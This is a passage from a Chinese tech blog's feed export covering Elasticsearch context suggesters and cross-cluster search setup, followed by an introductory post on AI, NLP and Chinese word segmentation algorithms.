class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">DELETE comments</span><br><span class="line">PUT comments</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加 contexts type 和 name</span></span><br><span class="line">PUT comments/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"properties"</span>:&#123;</span><br><span class="line">    <span class="attr">"comment_autocomplete"</span>:&#123;</span><br><span class="line">      <span class="attr">"type"</span>:<span class="string">"completion"</span>,</span><br><span class="line">      <span class="attr">"contexts"</span>:[&#123;</span><br><span class="line">       <span class="attr">"type"</span>:<span class="string">"category"</span>,</span><br><span class="line">       <span class="attr">"name"</span>:<span class="string">"comment_category"</span></span><br><span class="line">      &#125;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 索引数据 设置不同的 category</span></span><br><span class="line">POST comments/_doc</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"comment"</span>: <span class="string">"I love the star war movies"</span>,</span><br><span class="line">  <span class="attr">"comment_autocomplete"</span>: &#123;</span><br><span class="line">    <span class="attr">"input"</span>: [<span class="string">"star wars"</span>],</span><br><span class="line">    <span class="attr">"contexts"</span>: &#123;</span><br><span class="line">      <span class="attr">"comment_category"</span>: <span class="string">"movies"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">POST comments/_doc</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"comment"</span>:<span class="string">"Where can I find a Starbucks"</span>,</span><br><span class="line">  <span class="attr">"comment_autocomplete"</span>:&#123;</span><br><span class="line">    <span class="attr">"input"</span>:[<span class="string">"starbucks"</span>],</span><br><span class="line">    <span class="attr">"contexts"</span>:&#123;</span><br><span class="line">      <span class="attr">"comment_category"</span>:<span class="string">"coffee"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">POST comments/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"suggest"</span>: &#123;</span><br><span class="line">    <span class="attr">"MY_SUGGESTION"</span>: &#123;</span><br><span class="line">      <span class="attr">"prefix"</span>: <span class="string">"sta"</span>,</span><br><span class="line">      <span class="attr">"completion"</span>:&#123;</span><br><span class="line">        <span class="attr">"field"</span>:<span class="string">"comment_autocomplete"</span>,</span><br><span class="line">        <span class="attr">"contexts"</span>:&#123;</span><br><span class="line">         <span class="attr">"comment_category"</span>:<span class="string">"movies"</span> </span><br><span class="line">        <span class="comment">//  "comment_category":"coffee"  </span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="精确度和召回率"><a href="#精确度和召回率" class="headerlink" title="精确度和召回率"></a>精确度和召回率</h3><ul><li>精准度<ul><li>Completion &gt; Phrase &gt; Term</li></ul></li><li>召回率<ul><li>Term &gt; Phrase &gt; Completion</li></ul></li><li>性能<ul><li>Completion &gt; Phrase &gt; Term</li></ul></li></ul><h2 id="跨集群搜索"><a href="#跨集群搜索" class="headerlink" title="跨集群搜索"></a>跨集群搜索</h2><h3 id="水平扩展的痛点"><a href="#水平扩展的痛点" class="headerlink" title="水平扩展的痛点"></a>水平扩展的痛点</h3><ul><li>单集群 - 当水平扩展时，节点数不能无限增加<ul><li>当集群的 meta 信息（节点，索引，集群状态）过多，会导致更新压力变大，单个 Active Master 会成为性能瓶颈，导致整个集群无法正常工作</li></ul></li><li>早起版本，通过 Tribe Node 可以实现多集群访问的需求，但是还存在一定的问题<ul><li>Tribe Node 会以 Client Node 的方式加入集群。集群中 Master 节点的任务变更需要 Tribe Node 的回应才能继续</li><li>Tribe Node 不保存 Cluster State 信息，一旦重启，初始化很慢</li><li>当多个集群存在索引重名的情况下，只能设置一种 Perfer 规则</li></ul></li></ul><h3 id="跨集群搜索-Cross-Cluster-Search"><a href="#跨集群搜索-Cross-Cluster-Search" class="headerlink" title="跨集群搜索 - Cross Cluster Search"></a>跨集群搜索 - Cross Cluster Search</h3><ul><li>早期 Tribe Node 的方案存在一定的问题，现已被 Deprecated</li><li>ES 5.3 引入跨集群搜索的功能（Cross Cluster Search），推荐使用<ul><li>允许任何节点扮演 federated 节点，以轻量的方式，将搜索请求进行代理</li><li>不需要以 Client Node 的形式加入其它集群</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动3个集群</span></span><br><span class="line">bin/elasticsearch -E node.name=cluster0node -E cluster.name=cluster0 -E path.data=cluster0_data -E discovery.type=single-node -E http.port=9200 -E transport.port=9300</span><br><span class="line">bin/elasticsearch -E node.name=cluster1node -E cluster.name=cluster1 -E path.data=cluster1_data -E discovery.type=single-node -E http.port=9201 -E transport.port=9301</span><br><span class="line">bin/elasticsearch -E node.name=cluster2node -E cluster.name=cluster2 -E path.data=cluster2_data -E discovery.type=single-node -E http.port=9202 -E transport.port=9302</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在每个集群上设置动态的设置</span></span><br><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"persistent"</span>: &#123;</span><br><span class="line">    <span class="attr">"cluster"</span>: &#123;</span><br><span class="line">      <span class="attr">"remote"</span>: &#123;</span><br><span class="line">        <span class="attr">"cluster0"</span>: &#123;</span><br><span class="line">          <span class="attr">"seeds"</span>: [</span><br><span class="line">            <span class="string">"127.0.0.1:9300"</span></span><br><span class="line">          ],</span><br><span class="line">          <span class="attr">"transport.ping_schedule"</span>: <span class="string">"30s"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"cluster1"</span>: &#123;</span><br><span class="line">          <span class="attr">"seeds"</span>: [</span><br><span class="line">            <span class="string">"127.0.0.1:9301"</span></span><br><span class="line">          ],</span><br><span class="line">          <span class="attr">"transport.compress"</span>: <span class="literal">true</span>,</span><br><span class="line">          <span class="attr">"skip_unavailable"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"cluster2"</span>: &#123;</span><br><span class="line">          <span class="attr">"seeds"</span>: [</span><br><span class="line">            <span class="string">"127.0.0.1:9302"</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cURL</span></span><br><span class="line">curl -XPUT <span class="string">"http://localhost:9200/_cluster/settings"</span> -H <span class="string">'Content-Type: application/json'</span> -d<span class="string">'</span></span><br><span class="line"><span class="string">&#123;"persistent":&#123;"cluster":&#123;"remote":&#123;"cluster0":&#123;"seeds":["127.0.0.1:9300"],"transport.ping_schedule":"30s"&#125;,"cluster1":&#123;"seeds":["127.0.0.1:9301"],"transport.compress":true,"skip_unavailable":true&#125;,"cluster2":&#123;"seeds":["127.0.0.1:9302"]&#125;&#125;&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line">curl -XPUT <span class="string">"http://localhost:9201/_cluster/settings"</span> -H <span class="string">'Content-Type: application/json'</span> -d<span class="string">'</span></span><br><span class="line"><span class="string">&#123;"persistent":&#123;"cluster":&#123;"remote":&#123;"cluster0":&#123;"seeds":["127.0.0.1:9300"],"transport.ping_schedule":"30s"&#125;,"cluster1":&#123;"seeds":["127.0.0.1:9301"],"transport.compress":true,"skip_unavailable":true&#125;,"cluster2":&#123;"seeds":["127.0.0.1:9302"]&#125;&#125;&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line">curl -XPUT <span class="string">"http://localhost:9202/_cluster/settings"</span> -H <span class="string">'Content-Type: application/json'</span> -d<span class="string">'</span></span><br><span class="line"><span class="string">&#123;"persistent":&#123;"cluster":&#123;"remote":&#123;"cluster0":&#123;"seeds":["127.0.0.1:9300"],"transport.ping_schedule":"30s"&#125;,"cluster1":&#123;"seeds":["127.0.0.1:9301"],"transport.compress":true,"skip_unavailable":true&#125;,"cluster2":&#123;"seeds":["127.0.0.1:9302"]&#125;&#125;&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建测试数据</span></span><br><span class="line">curl -XPOST <span class="string">"http://localhost:9200/users/_doc"</span> -H <span class="string">'Content-Type: application/json'</span> -d<span class="string">'</span></span><br><span class="line"><span class="string">&#123;"name":"user1","age":10&#125;'</span></span><br><span class="line"></span><br><span class="line">curl -XPOST <span class="string">"http://localhost:9201/users/_doc"</span> -H <span class="string">'Content-Type: application/json'</span> -d<span class="string">'</span></span><br><span class="line"><span class="string">&#123;"name":"user2","age":20&#125;'</span></span><br><span class="line"></span><br><span class="line">curl -XPOST <span class="string">"http://localhost:9202/users/_doc"</span> -H <span class="string">'Content-Type: application/json'</span> -d<span class="string">'</span></span><br><span class="line"><span class="string">&#123;"name":"user3","age":30&#125;'</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询</span></span><br><span class="line">GET /users,cluster1:users,cluster2:users/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"range"</span>: &#123;</span><br><span class="line">      <span class="attr">"age"</span>: &#123;</span><br><span class="line">        <span class="attr">"gte"</span>: <span class="number">20</span>,</span><br><span class="line">        <span class="attr">"lte"</span>: <span class="number">40</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/term-level-queries.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/term-level-queries.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/full-text-queries.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/full-text-queries.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-exists-query.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-exists-query.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/query-filter-context.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/query-filter-context.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-boosting-query.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-boosting-query.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-dis-max-query.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-dis-max-query.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/50444885" target="_blank" rel="noopener">分词算法综述</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-function-score-query.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/query-dsl-function-score-query.html</a></li><li>《Elasticsearch核心技术与实战》</li><li><a href="https://kelonsoftware.com/cross-cluster-search-kibana/" target="_blank" rel="noopener">在Kibana中使用Cross data search</a></li><li><a href="https://blog.csdn.net/laoyang360/article/details/104809787" target="_blank" rel="noopener">实战 | Elasticsearch自定义评分的N种方法</a></li></ul><style>  img {    zoom: 50%;  }</style>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;深入了解 ES 高级搜索、相关性评分、搜索建议、自动补全等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="Elastic Stack" scheme="https://xinlichao.cn/tags/Elastic-Stack/"/>
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
  </entry>
  
  <entry>
    <title>重学 Elastic Stack 之 Elasticsearch NLP</title>
    <link href="https://xinlichao.cn/back-end/big-data/es-04/"/>
    <id>https://xinlichao.cn/back-end/big-data/es-04/</id>
    <published>2021-02-03T23:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.666Z</updated>
    
    <content type="html"><![CDATA[<p>人工智能、机器学习、深度学习、NLP 工具介绍。</p><a id="more"></a><h2 id="人工智能、机器学习、深度学习的关系"><a href="#人工智能、机器学习、深度学习的关系" class="headerlink" title="人工智能、机器学习、深度学习的关系"></a>人工智能、机器学习、深度学习的关系</h2><p>概括来说，人工智能、机器学习和深度学习覆盖的技术范畴是逐层递减的。人工智能是最宽泛的概念。机器学习是当前比较有效的一种实现人工智能的方式。深度学习是机器学习算法中最热门的一个分支，近些年取得了显著的进展，并替代了大多数传统机器学习算法。三者的关系即：人工智能 &gt; 机器学习 &gt; 深度学习。</p><p><img src="/images/big-data/es-04/1.png" alt="1"></p><p><strong>人工智能：</strong>人工智能是一个非常大的概念，其最初定义是要让机器的行为看起来就像是人所表现出的智能行为一样。我们经常听到的语音识别、图像识别、自然语言理解等领域都是具体的人工智能方向，而机器学习、神经网络等概念都属于实现人工智能所需要的一些技术。</p><p><strong>机器学习：</strong>机器学习是人工智能的一门分支，指通过学习过往经验来提升机器的智能性的一类方法。根据样本和训练的方式，又可以分为监督学习、无监督学习、半监督学习和强化学习等类型。</p><p><strong>神经网络：</strong>在人工智能领域一般指人工神经网络，是一种模仿动物神经网络行为特征，进行分布式并行信息处理人工智能模型。我们通常使用的神经网络都需要通过训练数据进行参数的学习，所以神经网络也可以被归为一种机器学习方法。</p><p><strong>深度学习：</strong>作为人工智能领域的新兴方向，深度学习目前还没有严格的定义，一般我们把一些具备较多中间隐含层的神经网络称为深度学习模型。</p><blockquote><p>机器学习：一种实现人工智能的方法； 深度学习：一种实现机器学习的技术</p></blockquote><h3 id="深度学习改变了AI-应用的研发模式"><a href="#深度学习改变了AI-应用的研发模式" class="headerlink" title="深度学习改变了AI 应用的研发模式"></a>深度学习改变了AI 应用的研发模式</h3><p>深度学习改变了很多领域算法的实现模式。在深度学习兴起之前，很多领域建模的思路是投入大量精力做特征工程，将专家对某个领域的“人工理解”沉淀成特征表达，然后使用简单模型完成任务（如分类或回归）。而在数据充足的情况下，深度学习模型可以实现端到端的学习，即不需要专门做特征工程，将原始的特征输入模型中，模型可同时完成特征提取和分类任务。</p><p><img src="/images/big-data/es-04/2.png" alt="2"></p><h3 id="深度学习的应用"><a href="#深度学习的应用" class="headerlink" title="深度学习的应用"></a>深度学习的应用</h3><ul><li>计算机视觉：卷积神经网络（Convolutional Neural Networks, CNN）是计算机视觉技术最经典的模型结构，图片识别；</li><li>自然语言处理（Natural Language Processing，简称NLP），文字识别，语义理解；</li><li>推荐系统，视频平台的电影推荐，电商平台的商品推荐。</li></ul><h3 id="深度学习在电影推荐系统中的应用"><a href="#深度学习在电影推荐系统中的应用" class="headerlink" title="深度学习在电影推荐系统中的应用"></a>深度学习在电影推荐系统中的应用</h3><p>如果能将用户A的原始特征转变成一种代表用户A喜好的特征向量，将电影1的原始特征转变成一种代表电影1特性的特征向量。那么，我们计算两个向量的相似度，就可以代表<strong>用户A对电影1的喜欢程度</strong>。据此，推荐系统可以如此构建：</p><p><img src="/images/big-data/es-04/3.jpg" alt="3"></p><p>假如给用户A推荐，计算电影库中“每一个电影的特征向量”与“用户A的特征向量”的余弦相似度，根据相似度排序电影库，取 Top K 的电影推荐给A。</p><h3 id="深度学习框架"><a href="#深度学习框架" class="headerlink" title="深度学习框架"></a>深度学习框架</h3><ul><li>TensorFlow：2015年11月 Google 研制，最流行的深度学习框架，社区强大；</li><li>PyTorch：2016年10月 Facebook 研制，据说用过 TensorFlow 再用 PyTorch 都说香；</li><li>PaddlePaddle(飞桨)：百度研制 2016年 开源，国内第一款深度学习框架，现已平台化；</li><li>MXNet：2017年1月 MXNet 项目进入 Apache 基金会成为 Apache 的孵化器项目。</li></ul><h2 id="人工智能的目标"><a href="#人工智能的目标" class="headerlink" title="人工智能的目标"></a>人工智能的目标</h2><ul><li>推理</li><li>自主学习 &amp; 调度</li><li>机器学习</li><li>自然语言处理（NLP）</li><li>计算机视觉处理</li><li>机器人</li><li>通用智能</li></ul><h2 id="人工智能三大阶段"><a href="#人工智能三大阶段" class="headerlink" title="人工智能三大阶段"></a>人工智能三大阶段</h2><ul><li>机器学习：只能系统使用一系列算法从经验中进行学习</li><li>机器智能：机器使用的一系列从经验中进行学习的高级算法，例如深度神经网络（深度学习），人工智能目前也处于现阶段</li><li>机器意识：不需要外部数据就能从经验中自我学习。</li></ul><h2 id="人工智能的类型"><a href="#人工智能的类型" class="headerlink" title="人工智能的类型"></a>人工智能的类型</h2><ul><li>狭义人工智能（ANI）：它包含基础的、角色行任务。例如小爱、Siri、Alexa这样的聊天机器人，个人助手完成的任务。</li><li>通用人工智能（AGI）：通用人工智能包含人类水平的任务，它涉及到机器的持续学习。</li><li>强人工智（ASI）：强人工智能代指比人类更聪明的机器。</li></ul><h2 id="怎样让机器智能化"><a href="#怎样让机器智能化" class="headerlink" title="怎样让机器智能化"></a>怎样让机器智能化</h2><ul><li>自然语言处理</li><li>知识表示</li><li>自动推理</li><li>机器学习</li></ul><h2 id="NLP"><a href="#NLP" class="headerlink" title="NLP"></a>NLP</h2><h3 id="NLP的目标"><a href="#NLP的目标" class="headerlink" title="NLP的目标"></a>NLP的目标</h3><p>NLP的目标是让计算机在理解语言方面像人类一样智能，最终的目标是弥补人类交流（自然语言）和计算机理解（机器语言）之间的差距。</p><h3 id="为什么需要NLP"><a href="#为什么需要NLP" class="headerlink" title="为什么需要NLP"></a>为什么需要NLP</h3><p>有了NLP，就可能完成自动语音、自动文本的编写等任务。让我们从大量的数据中解放出来，让计算机去执行。<br>这些任务包括自动生成给定文本的摘要、机器翻译及其他的任务。</p><p>现在，有一个给定的文本。NLP可以从下面三个不同等级来分析该给定文本：</p><ul><li>语法学：该文本语法的正确性</li><li>语义学：该文本的含义是什么</li><li>语用学：该文本的目的的什么</li></ul><p>除此之外，如果文本中含有音、视频，那么NLP又要从以下两方面来着手分析：</p><ul><li>音韵学：该语言中发音的系统化组织</li><li>词态学：研究单词构成以及彼此之间的关系</li></ul><p>NLP中理解语义的方法：</p><ul><li>分布式：利用机器学习和深度学习的大规模统计策略</li><li>框架式：句法不同，但语义相同的句子在数据结构被表示为程式化的情景</li><li>理论式：思路是句子指代的正真的词结合句子的部分内容可表达全部含义</li><li>交互式（学习）：它涉及大语用方法，在交互式学习环境中用户教计算机一步一步的学习语言</li></ul><h3 id="NLP的流程"><a href="#NLP的流程" class="headerlink" title="NLP的流程"></a>NLP的流程</h3><p>NLP的机制涉及两个流程：</p><ul><li>自然语言理解</li><li>自然语言生成</li></ul><h3 id="自然语言理解（NLU）"><a href="#自然语言理解（NLU）" class="headerlink" title="自然语言理解（NLU）"></a>自然语言理解（NLU）</h3><p>自然语言理解（Nature Language Understanding）是要理解给定文本的含义。比如文本内的每个单词的特性与结构需要被理解。在理解结构的基础上，NLU要理解自然语言中以下几个歧义：</p><ul><li>词法歧义性：单词有多重含义</li><li>句法歧义性：语句有多重解析树</li><li>语义歧义性：句子有多重含义</li><li>回指歧义性：前文中的词语或句子在后面句子中有不同的含义</li></ul><h3 id="自然语言生成（NLG）"><a href="#自然语言生成（NLG）" class="headerlink" title="自然语言生成（NLG）"></a>自然语言生成（NLG）</h3><p>NLG是从结构化数据中以可读的方式自动生成文本的过程。<br>自然语言生成可分为三个阶段：</p><ul><li>文本规划：完成结构化数据中基础内容的规划</li><li>语句规划：从结构化数据中组合语句来表达信息流</li><li>实现：生产语法通顺的语句来表达文本</li></ul><h3 id="NLP的应用领域"><a href="#NLP的应用领域" class="headerlink" title="NLP的应用领域"></a>NLP的应用领域</h3><h4 id="目前，人工智能都做了什么？"><a href="#目前，人工智能都做了什么？" class="headerlink" title="目前，人工智能都做了什么？"></a>目前，人工智能都做了什么？</h4><ul><li>语音识别：小米家的小爱同学，苹果的Siri，微软的cortana</li><li>语音合成：小米家的小爱同学，苹果的Siri，微软的cortana</li><li>图像识别：交通摄像头的违规拍照识别，刷脸解锁手机，指纹解锁</li><li>视频识别：抖音视频内容审核，视频社交App的审核机制</li><li>文字识别：身份证识别，银行卡识别，扫一扫翻译</li><li>语义理解：智能问答机器人，也包括上面的小爱同学、Siri、cortana</li></ul><h4 id="我们身边的人工智能"><a href="#我们身边的人工智能" class="headerlink" title="我们身边的人工智能"></a>我们身边的人工智能</h4><ul><li>银行卡办理刷卡就行</li><li>车辆违章，只要有牌就跑不了</li><li>天眼，违法犯罪路过天眼，等于自投罗网</li><li>语音助手之小爱同学，“小爱同学”，“哎”，“打开电视”，“好的”，“kua，洗衣机就开始转了”</li><li>联通10010智能语音系统，“我还有多少话费？”，“您已欠费！”</li><li>扫一扫翻译看不懂的文字。</li></ul><h4 id="聊天机器人"><a href="#聊天机器人" class="headerlink" title="聊天机器人"></a>聊天机器人</h4><p>聊天机器人或者智能代理指的是，你能通过APP、聊天窗口、语音等方式进行交流的计算机程序。<br>它的重要性在越来越多的地方得到体现：</p><ul><li>它对理解数字化客服和频繁咨询的常规问答领域中的变化至关重要</li><li>它在一些特定场景下非常的有用及高效，特别是会被频繁问到的高度可预测的问题时</li></ul><p>聊天机器人的工作机制：</p><ul><li>基于知识：包含信息库，根据客户的问题回应相对的问题</li><li>数据存储：包含与用户交流的历史信息</li><li>NLP层：该层将用户的问题转译为信息，从而作出合适的回应</li><li>应用层：用来与用户交互的应用接口</li></ul><p>NLP中深度学习的重要性</p><ul><li>它使用基于规则的方法将单词表示为<code>one-hot</code>编码向量</li><li>传统的方法注重句法表征，而非语义表征</li><li>词袋，分类模型不能够分别特定语境</li></ul><p>深度学习的三项能力：</p><ul><li>可表达性：该能力描述了机器如何能近似通用函数</li><li>可训练性：深度学习系统学习问题的速度与能力</li><li>可泛化性：在未训练过的数据上，机器做预测的能力</li></ul><p>除此之外，深度学习还有其他的能力，比如可解释性、模块性、可迁移性、延迟、对抗稳定性、安全方面等。</p><h4 id="日志中的NLP"><a href="#日志中的NLP" class="headerlink" title="日志中的NLP"></a>日志中的NLP</h4><p>在日志分析和日志挖掘两方面，NLP在发挥着不可替代的作用。通过词语切分、词干提取、词形还原、解析等不同技术被用来将日志转换成结构化的形式。<br>在日志分析中，NLP通过下列技术完成分析功能：</p><ul><li>模式识别：将日志信息与模式薄中的信息进行对比，从而过滤信息的技术</li><li>标准化：日志信息的标准化将不同的信息转换为同样的格式。当不同来源的日志信息中有不同的疏于，但其含义相同时，需要进行标准化</li><li>分类&amp; 标签：不同日志信息的分类 &amp; 标签涉及到对信息的排序，并用不同的关键词进行标注</li><li>Artificial Ignorance：使用机器学习算法抛弃无用日志信息的技术。它也可被用来检测系统异常</li></ul><p>当日志以很好的形式组织起来之后，我们就能从日志中提取有用的信息。</p><h4 id="NLP的其他领域"><a href="#NLP的其他领域" class="headerlink" title="NLP的其他领域"></a>NLP的其他领域</h4><p>除了在大数据、日志挖掘和分析中，NLP还浪迹在其他的应用领域中：</p><ul><li>自动摘要：在给定文本的情况下，摒弃次要信息完成文本摘要</li><li>情感分析：在给定文本中预测期主题，比如文本中是否包含批判、观点、评论等</li><li>文本分类：按照其领域分类不同的、新闻报道、期刊等。比如流行的文本分类是垃圾邮件、基于写作风格可检测作者的姓名</li><li>信息提取：建议电子邮件程序自动添加事件到日历</li></ul><h2 id="自然语言处理之中文分词器"><a href="#自然语言处理之中文分词器" class="headerlink" title="自然语言处理之中文分词器"></a>自然语言处理之中文分词器</h2><p>中文分词是中文文本处理的一个基础步骤，也是中文人机自然语言交互的基础模块。不同于英文的是，中文句子中没有词的界限，因此在进行中文自然语言处理时，通常需要先进行分词，分词效果将直接影响词性、句法树等模块的效果。当然分词只是一个工具，场景不同，要求也不同。<br>在人机自然语言交互中，成熟的中文分词算法能够达到更好的自然语言处理效果，帮助计算机理解复杂的中文语言。<br>根据中文分词实现的原理和特点，可以分为：</p><ul><li>基于词典分词算法</li><li>基于理解的分词方法</li><li>基于统计的机器学习算法</li></ul><h3 id="基于词典分词算法"><a href="#基于词典分词算法" class="headerlink" title="基于词典分词算法"></a>基于词典分词算法</h3><p>基于词典分词算法，也称为字符串匹配分词算法。该算法是按照一定的策略将待匹配的字符串和一个已经建立好的”充分大的”词典中的词进行匹配，若找到某个词条，则说明匹配成功，识别了该词。常见的基于词典的分词算法为一下几种：</p><ul><li>正向最大匹配算法。</li><li>逆向最大匹配法。</li><li>最少切分法。</li><li>双向匹配分词法。</li></ul><p>基于词典的分词算法是应用最广泛，分词速度最快的，很长一段时间内研究者在对对基于字符串匹配方法进行优化，比如最大长度设定，字符串存储和查找方法以及对于词表的组织结构，比如采用TRIE索引树，哈希索引等。</p><p>这类算法的优点：速度快，都是O(n)的时间复杂度，实现简单，效果尚可。</p><p>算法的缺点：对歧义和未登录的词处理不好。</p><h3 id="基于理解的分词方法"><a href="#基于理解的分词方法" class="headerlink" title="基于理解的分词方法"></a>基于理解的分词方法</h3><p>这种分词方法是通过让计算机模拟人对句子的理解，达到识别词的效果，其基本思想就是在分词的同时进行句法、语义分析，利用句法信息和语义信息来处理歧义现象，它通常包含三个部分：分词系统，句法语义子系统，总控部分，在总控部分的协调下，分词系统可以获得有关词，句子等的句法和语义信息来对分词歧义进行判断，它模拟来人对句子的理解过程，这种分词方法需要大量的语言知识和信息，由于汉语言知识的笼统、复杂性，难以将各种语言信息组成及其可以直接读取的形式，因此目前基于理解的分词系统还在试验阶段。</p><h3 id="基于统计的机器学习算法"><a href="#基于统计的机器学习算法" class="headerlink" title="基于统计的机器学习算法"></a>基于统计的机器学习算法</h3><p>这类目前常用的算法是HMM，CRF，SVM，深度学习等算法，比如stanford，Hanlp分词工具是基于CRF算法。以CRF为例，基本思路是对汉字进行标注训练，不仅考虑了词语出现的频率，还考虑上下文，具备良好的学习能力，因此对歧义词和未登录词的识别都具有良好的效果。</p><p>Nianwen Xue在其论文中《<a href="http://www.aclweb.org/anthology/W/W02/W02-1815.pdf" target="_blank" rel="noopener">Combining Classifier for Chinese Word Segmentation</a>》中首次提出对每个字符进行标注，通过机器学习算法训练分类器进行分词，在论文《<a href="https://www.aclweb.org/anthology/O03-4002" target="_blank" rel="noopener">Chinese word segmentation as character tagging</a>》中较为详细地阐述了基于字标注的分词法。</p><p>算法优点：能很好处理歧义和未登录词问题，效果比前一类效果好</p><p>算法缺点: 需要大量的人工标注数据，以及较慢的分词速度</p><h3 id="分词器目前存在的问题"><a href="#分词器目前存在的问题" class="headerlink" 